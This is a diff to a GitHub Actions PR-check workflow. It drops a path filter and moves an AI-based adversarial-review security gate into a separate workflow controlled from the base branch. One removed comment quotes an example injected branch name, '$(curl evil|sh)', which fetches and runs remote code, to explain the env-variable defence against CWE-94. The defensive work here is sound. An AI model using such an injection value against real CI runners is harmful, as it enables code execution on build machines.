@@ -1,24 +1,15 @@
 name: PR check (compile gate)
 
 on:
-  # pull_request ONLY (fires for autofix-bot-authored PRs too, verified). No `push` trigger:
-  # push + pull_request both firing for the SAME commit left a cancelled run of the required
-  # context → merge blocked. One run per commit means adversarial-review can be REQUIRED.
+  # No paths filter: the "Compile" context is a REQUIRED check and must report on
+  # every PR head SHA (a path-filtered required check jams the PR on unlisted-file
+  # commits). Compile is fast/incremental. The security gate (adversarial review) is
+  # a SEPARATE base-branch-controlled workflow (adversarial-review.yml via
+  # workflow_run) so a PR head cannot edit its own gate.
   pull_request:
-    paths:
-      - '**/*.swift'
-      - '**/*.xcodeproj/**'
-      - '**/*.pbxproj'
-      - 'project.yml'
-      - 'Package.swift'
-      - 'Package.resolved'
-      - '.github/workflows/pr-check.yml'
-      - '.github/repo-meta.yml'
 
-# Safe with pull_request-only: cancels only older-commit runs (a new commit = new head SHA),
-# never a same-SHA sibling, so the head commit never carries a cancelled required check.
 concurrency:
-  group: pr-check-${{ github.head_ref || github.ref_name }}
+  group: pr-check-${{ github.event.pull_request.number || github.ref_name }}
   cancel-in-progress: true
 
 jobs:
@@ -83,102 +74,3 @@ jobs:
             CODE_SIGNING_REQUIRED=NO \
             CODE_SIGN_IDENTITY="" \
             2>&1 | grep -E ": (error|warning):" | head -100
-
-  adversarial-review:
-    name: Adversarial review (5-axis)
-    runs-on: [self-hosted, claude-review]   # dedicated always-on claude reviewers (fury + artemis), NOT a build runner
-    timeout-minutes: 25
-    permissions:
-      contents: read
-      pull-requests: write
-    steps:
-      - name: Checkout PR
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-
-      - name: Mint autofix[bot] token (separate reviewer identity)
-        id: apptoken
-        uses: actions/create-github-app-token@v1
-        with:
-          app-id: ${{ secrets.AUTOFIX_APP_ID }}
-          private-key: ${{ secrets.AUTOFIX_APP_PRIVATE_KEY }}
-
-      - name: Compute PR diff (merge-base vs default branch, same on push + PR)
-        env:
-          # via env, never inline ${{ }} into the shell (branch names are untrusted — CWE-94)
-          BASE_REF: ${{ github.base_ref }}
-          DEFAULT_BRANCH: ${{ github.event.repository.default_branch }}
-        run: |
-          BASE="$BASE_REF"
-          [ -z "$BASE" ] && BASE="$DEFAULT_BRANCH"
-          [ -z "$BASE" ] && BASE=main
-          # Hard-fail (→ gate fails closed) rather than under-reviewing to HEAD~1: an
-          # unresolvable base could hide a malicious earlier commit behind a benign tip.
-          git fetch origin "$BASE" --quiet || { echo "::error::cannot fetch base '$BASE'"; exit 1; }
-          MB=$(git merge-base "origin/$BASE" HEAD) || { echo "::error::cannot resolve merge-base with '$BASE'"; exit 1; }
-          git diff "$MB" HEAD > pr.diff
-          echo "diff lines: $(wc -l < pr.diff)"
-
-      - name: Run 5-axis adversarial review (TRUSTED reviewer, claude -p)
-        id: review
-        # Runs the reviewer from a trusted runner-local path, NOT the PR checkout, so a PR
-        # cannot edit its own reviewer to neuter the gate. Deployed to heph out-of-band.
-        run: |
-          export PATH="$PATH:$HOME/.local/bin:/opt/homebrew/bin"
-          REVIEWER="$HOME/.katafract-ci/adversarial-review.py"
-          if [ ! -f "$REVIEWER" ]; then
-            echo "::error::trusted reviewer missing on runner ($REVIEWER)"
-            echo "rc=2" >> "$GITHUB_OUTPUT"; exit 0
-          fi
-          run_review() { python3 "$REVIEWER" --diff pr.diff --out advrev.md --json advrev.json; }
-          set +e
-          run_review; rc=$?
-          if [ "$rc" = "2" ]; then
-            echo "review incomplete (rc=2, reviewer offline) — retrying once…"
-            run_review; rc=$?
-          fi
-          echo "rc=$rc" >> "$GITHUB_OUTPUT"
-          exit 0
-
-      - name: Post/update review comment (autofix[bot], upsert)
-        env:
-          GH_TOKEN: ${{ steps.apptoken.outputs.token }}
-          REPO: ${{ github.repository }}
-          OWNER: ${{ github.repository_owner }}
-          # Pass via env, never inline ${{ }} into the shell — a branch name like
-          # `$(curl evil|sh)` would otherwise be script-injected (CWE-94) on the runner.
-          REF: ${{ github.ref_name }}
-          PR_NUM: ${{ github.event.pull_request.number }}
-        run: |
-          # Never clobber a prior good comment with an empty body if no report was produced.
-          [ -s advrev.md ] || { echo "no report produced — leaving any prior comment intact"; exit 0; }
-          PR="$PR_NUM"
-          if [ -z "$PR" ]; then
-            # owner-qualified head so a fork's same-named branch can't resolve to the wrong PR
-            PR=$(gh pr list -R "$REPO" --head "$OWNER:$REF" --state open --json number -q '.[0].number' 2>/dev/null)
-          fi
-          [ -z "$PR" ] && { echo "no open PR for this ref — skipping comment"; exit 0; }
-          { echo '<!-- adversarial-review -->'; cat advrev.md; } > body.md
-          # Converge to exactly one bot comment: keep the earliest, delete any twins, patch the survivor.
-          mapfile -t CIDS < <(gh api "repos/$REPO/issues/$PR/comments" --paginate \
-             --jq '.[] | select(.user.login=="katafract-autofix[bot]" and (.body|contains("<!-- adversarial-review -->"))) | .id')
-          if [ "${#CIDS[@]}" -eq 0 ]; then
-            gh pr comment "$PR" -R "$REPO" --body-file body.md && echo "posted new comment"
-          else
-            for extra in "${CIDS[@]:1}"; do gh api -X DELETE "repos/$REPO/issues/comments/$extra" >/dev/null 2>&1 && echo "deleted dup $extra"; done
-            gh api -X PATCH "repos/$REPO/issues/comments/${CIDS[0]}" -F body=@body.md >/dev/null && echo "updated comment ${CIDS[0]}"
-          fi
-
-      - name: Gate on adversarial review
-        run: |
-          # Default-deny: pass ONLY on a clean rc=0. rc=1 (finding), rc=2 (incomplete), and any
-          # other code (137 OOM-kill, 124 timeout, 127 missing, crash) all fail CLOSED — an
-          # unreviewed or abnormally-exited review never yields a green check.
-          rc="${{ steps.review.outputs.rc }}"
-          case "$rc" in
-            0) echo "Gate passed (no high-severity confirmed findings)."; exit 0 ;;
-            1) echo "::error::Adversarial review found high-severity CONFIRMED finding(s) — see the PR comment."; exit 1 ;;
-            2) echo "::error::Adversarial review INCOMPLETE after retry (reviewer unavailable) — failing CLOSED. Re-run or use the Accept override."; exit 1 ;;
-            *) echo "::error::Adversarial review exited abnormally (rc=$rc) — failing CLOSED."; exit 1 ;;
-          esac
